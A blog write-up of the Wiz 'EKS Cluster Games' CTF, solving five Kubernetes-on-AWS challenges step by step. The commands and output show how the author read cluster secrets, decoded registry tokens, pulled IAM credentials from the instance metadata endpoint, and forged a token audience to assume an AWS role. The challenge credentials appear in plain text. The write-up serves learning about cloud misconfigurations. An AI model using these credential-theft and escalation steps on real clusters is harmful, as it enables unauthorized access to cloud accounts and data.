---
title:  "AWS EKS Cluster Games"
date:   2024-01-05
categories: Cybersecurity Cloud-Computing
---
![card](/assets/images/eksclustergames/image.png)
This is a WriteUp of the [WIZ][link] "EKS Cluster Games". The games are a cloud security CTF about identifiying and exploiting common AWS EKS security issues in five different tasks, with a given hint and access to a low-privileged AWS EKS pod via a wev terminal.

## Challenge 1 - Secret Seeker
The given hint:
> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

The given permissions:
```
{
    "secrets": [
        "get",
        "list"
    ]
}
```

I started by listing all of the secrets.

```
# kubectl get secrets

NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      66d
```

There is one secret `log-rotate`, we can see its content by outputting it in the YAML format.

```
# kubectl get secrets log-rotate -o yaml

apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T13:02:08Z"
  name: log-rotate
  namespace: challenge1
  resourceVersion: "890951"
  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
type: Opaque
```

The flag can then be decoded using the base64 CLI.

```
$ echo "d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==" | base64 -d

wiz_eks_challenge{omg_over_privileged_secret_access}
```

## Challenge 2 - Registry Hunt
The given hint:
> A thing we learned during our research: always check the container registries. For your convenience, the crane utility is already pre-installed on the machine.

The given permissions:
```
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

I started by checking if there are any pods running.

```
# kubectl get pods

NAME                    READY   STATUS    RESTARTS      AGE
database-pod-2c9b3a4e   1/1     Running   1 (29d ago)   66d
```

To get more details on the `database-pod-2c9b3a4e` pod, I again looked at it in the YAML formatting.

```
# kubectl get pods database-pod-2c9b3a4e -o yaml

apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:05Z"
  name: database-pod-2c9b3a4e
  namespace: challenge2
  resourceVersion: "12166896"
  uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
spec:
  containers:
  - image: eksclustergames/base_ext_image
    imagePullPolicy: Always
    name: my-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-cq4m2
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
.
.
.
  - containerID: containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0
    image: docker.io/eksclustergames/base_ext_image:latest
    imageID: docker.io/eksclustergames/
.
.
.
```

Here I saw the image used is `docker.io/eksclustergames/base_ext_image:latest` and there exists a secret `registry-pull-secrets-780bab1d`, which is used to pull the image. Looking at the secret revealed the credentials used to authenticate with docker.io.

```
# kubectl get secrets registry-pull-secrets-780bab1d -o yaml

apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
```

```
$ echo "eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19" | base64 -d

{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}
```

```
$ echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==" | base64 -d

eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
```

We can now use these credentials to authenticate ourself using crane.

```
# crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo

2024/01/06 14:08:26 logged in via /home/user/.docker/config.json
```

Now we can check the content of the image, which revealed the flag.
```
# crane config docker.io/eksclustergames/base_ext_image:latest

{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:18.920734382Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' \u003e /flag.txt # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"]}}
```

> We successfully used this technique in both of our engagements with Alibaba Cloud and IBM Cloud to obtain internal container images and to prove unauthorized access to cross-tenant data.

# Challenge 3 - Image Inquisition
The given hint:
> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret. Remember: You are running inside a compromised EKS pod. For your convenience, the crane utility is already pre-installed on the machine.

The given permissions:
```
{
    "pods": [
        "list",
        "get"
    ]
}
```

We can only look at the pods, so lets do that.
```
# kubectl get pods

NAME                      READY   STATUS    RESTARTS      AGE
accounting-pod-876647f8   1/1     Running   1 (30d ago)   67d
```
```
# kubectl get pods accounting-pod-876647f8 -o yaml

apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:10Z"
  name: accounting-pod-876647f8
  namespace: challenge3
  resourceVersion: "12166911"
  uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
spec:
  containers:
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
    imagePullPolicy: IfNotPresent
    name: accounting-container
.
.
.
```

We see that the image is pulled from the AWS ECR `88655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c`, but we don't have an ImagePullSecret this time. This means, that the credentials need to be somewhere else. I was stuck at this point, so I needed another hint:

> Try contacting the IMDS to get the ECR credentials.

I researched what IMDS is and learned, that it stands for `Instance Metadata Service`. It is a system that provides EC2 instances with necessary metadata *like credentials*. Accessing it, can be done on the instance through a link-local address: `http://169.254.169.254/latest/meta-data/`

```
# curl http://169.254.169.254/latest/meta-data/

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
```

Under `iam` I was able to find AWS credentials.

```
# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole

{"AccessKeyId":"ASIA2AVYNEVM7EB4BDUN","Expiration":"2024-01-05 11:08:43+00:00","SecretAccessKey":"5mCDntpA21aSiOSUUjQ7Am/7uyaYxJF6Eslp5c+k","SessionToken":"LONG_SESSION_TOKEN"}
```

I set the three environment variables `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` to the given credentials on the web shell.

```
# export AWS_ACCESS_KEY_ID=ASIA2AVYNEVM7EB4BDUN
# export AWS_SECRET_ACCESS_KEY=5mCDntpA21aSiOSUUjQ7Am/7uyaYxJF6Eslp5c+k
# export AWS_SESSION_TOKEN=LONG_SESSION_TOKEN
```

With this I now was able to access the container registry to look at the images.

```
# aws ecr list-images --repository-name central_repo-aaf4a7c

{
    "imageIds": [
        {
            "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
            "imageTag": "374f28d8-container"
        }
    ]
}
```

To be able look at the image using crane we have to get a login password. This can be done using `aws ecr get-login-password`, the output thereof being passed directly to the crane login command.

```
# aws ecr get-login-password | crane auth login -u AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com

2024/01/05 10:29:03 logged in via /home/user/.docker/config.json
```

Now we can look at the image used again and see the flag in the image layers.
```
# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01

{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}
```

## Challenge 4 - Pod Break
The given hint:
> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?

The given permissions:
```
{}
```

We don't have any Kubernetes permissions, however from the last challenge, we have access to the AWS CLI. At first I checked the IAM identity.

```
# aws sts get-caller-identity

{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

Here we can see the name of the cluster `eks-challenge-cluster`. Again I was pretty stuck and had to consult the hints.
> EKS supports IAM authentication. Nodes connect to the cluster the same way users do. Check out the documentation.

I started searching through the `aws eks` CLI documentation and saw the `get-token` command. This command returns an access token, which can be used for authentication with an EKS cluster. So I tried doing that.

```
# aws eks get-token --cluster-name eks-challenge-cluster

{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2024-01-06T10:34:42Z",
        "token": "VERY_LONG_TOKEN"
    }
}
```

I first tried to create a kubeconfig using the `aws` CLI, this however failed.
```
# aws eks update-kubeconfig --name eks-challenge-cluster

An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
```

Then I learned, that `kubectl` has a global parameter `--token`, which I could append to any command to authenticate as that user. I could now check the privileges of the token generated.

```
# kubectl auth can-i --list --token=$TOKEN

warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
.
.
.

```

Now I could check pods and secrets, where I found the flag in the end.

```
# kubectl get pods --token=$TOKEN

No resources found in challenge4 namespace.
```

```
# kubectl get secrets --token=$TOKEN

NAME        TYPE     DATA   AGE
node-flag   Opaque   1      65d
```

```
# kubectl get secrets node-flag -o yaml --token=$TOKEN

apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T12:27:57Z"
  name: node-flag
  namespace: challenge4
  resourceVersion: "883574"
  uid: 26461a29-ec72-40e1-adc7-99128ce664f7
type: Opaque
```

```
$ echo "d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=" | base64 -d

wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
```

> Fun fact: The misconfiguration highlighted in this challenge is a common occurrence, and the same technique can be applied to any EKS cluster that doesn't enforce IMDSv2 hop limit.

## Challenge 5 - Container Secrets Infrastructure
The given hint:
> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?

The given IAM policy:
```
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

The given Trust policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

The given permissions:
```
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

The Trust policy shows us, that we may assume an AWS role using a web identity provided by EKS. Using that role we then can access the bucket `challenge-flag-bucket-3ff1ae2`

First I checked all the resources I had access to.

```
# kubectl get pods

No resources found in challenge5 namespace.
```

```
# kubectl get secrets

No resources found in challenge5 namespace.
```

```
# kubectl get serviceaccounts

NAME          SECRETS   AGE
debug-sa      0         66d
default       0         66d
s3access-sa   0         66d
```

Looking at the serviceaccounts in YAML format, we can see more information, like the AWS ARN role added to the `s3-access-sa` serviceaccount.

```
# kubectl get serviceaccounts -o yaml

apiVersion: v1
items:
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      description: This is a dummy service account with empty policy attached
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
    creationTimestamp: "2023-10-31T20:07:37Z"
    name: debug-sa
    namespace: challenge5
    resourceVersion: "671929"
    uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    creationTimestamp: "2023-10-31T20:07:11Z"
    name: default
    namespace: challenge5
    resourceVersion: "671804"
    uid: 77bd3db6-3642-40d5-b8c1-14fa1b0cba8c
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
    creationTimestamp: "2023-10-31T20:07:34Z"
    name: s3access-sa
    namespace: challenge5
    resourceVersion: "671916"
    uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
kind: List
metadata:
  resourceVersion: ""
```


I tried to create a token for the `s3-access-sa` serviceaccount, this however failed. Creating one for `debug-sa` worked.

```
# kubectl create token s3access-sa

error: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"
```

```
# kubectl create token debug-sa

VERY_LONG_ACCESS_TOKEN
```

I then tried to assume the role of `eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role`.

```
# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name s3access-sa --web-identity-token VERY_LONG_ACCESS_TOKEN

An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
```

Since the token is in the JWT format, I checked its content and saw that the field `audience` was set to `https://kubernetes.default.svc`. 

![aud1](/assets/images/eksclustergames/image1.png)

The Trust policy has a condition that states that the `aud` field must be equal to `sts.amazonaws.com`. This can be done during the token creation process using the `--audience` parameter.

```
# kubectl create token debug-sa --audience "sts.amazonaws.com"

ANOTHER_VERY_LONG_ACCESS_TOKEN
```

![aud2](/assets/images/eksclustergames/image2.png)

With this token it was now possible to assume the role.

```
# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name s3access-sa --web-identity-token ANOTHER_VERY_LONG_ACCESS_TOKEN

{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVMQECFBHEU",
        "SecretAccessKey": "vFsK53qeajym73u9/CVUmYmKcker+3kM9xKdNtTL",
        "SessionToken": "LONG_SESSION_TOKEN",
        "Expiration": "2024-01-06T12:24:12+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:s3access-sa",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/s3access-sa"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

I then set the environment variables again and checked the caller identity, which showed me, that I now had access to the `s3access-sa` role.

```
# aws sts get-caller-identity

{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:s3access-sa",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/s3access-sa"
}
```

Now I could access the bucket and the flag contained in it.

```
# aws s3 ls s3://challenge-flag-bucket-3ff1ae2
2023-11-01 12:27:55         72 flag
```

```
# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag ~/flag
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag
```

```
# cat flag 
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
```

## Reflection

![cert](/assets/images/eksclustergames/image3.png)

At the end I got a nice [certificate][finished]. This challenge was very hard for me, especially the last two. I have worked with both AWS and Kubernetes before, but not with the EKS service. I learned quite a few things about IAM policies and the IMDS. But to get to the end I still had to consult a lot of help. Very fun overall though!


[link]: https://www.wiz.io/blog/announcing-the-eks-cluster-games
[finished]: https://eksclustergames.com/finisher/MuQDdDfl